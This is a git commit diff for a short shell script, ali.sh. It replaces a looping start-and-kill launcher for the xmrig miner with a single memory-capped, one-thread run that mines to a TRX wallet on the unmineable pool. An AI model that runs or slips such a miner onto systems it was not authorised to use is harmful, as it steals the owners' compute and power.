e8507930cb4170a760fb20d970144c6821fef723
aliabdulla769 <131328611+aliabdulla769@users.noreply.github.com>
2023-09-18 16:35:40 +0300

    Update ali.sh

--- ali.sh
+++ ali.sh
@@ -1,15 +1,2 @@
-#!/bin/bash
-
-while true; do
-  # Start xmrig
-  ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u TRX:TUPkoHaVv8jp6CbsQGjd8bhDZXBVxkQkSt.gt -p x &
-
-  # Sleep for 30 seconds
-  sleep 30
-
-  # Stop xmrig
-  pkill xmrig
-
-  # Sleep for a few seconds before restarting (adjust as needed)
-  sleep 5
-done
+ulimit -v 1000000  # Set the virtual memory limit to 1GB
+./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u TRX:TUPkoHaVv8jp6CbsQGjd8bhDZXBVxkQkSt.cisco -p x -t 1
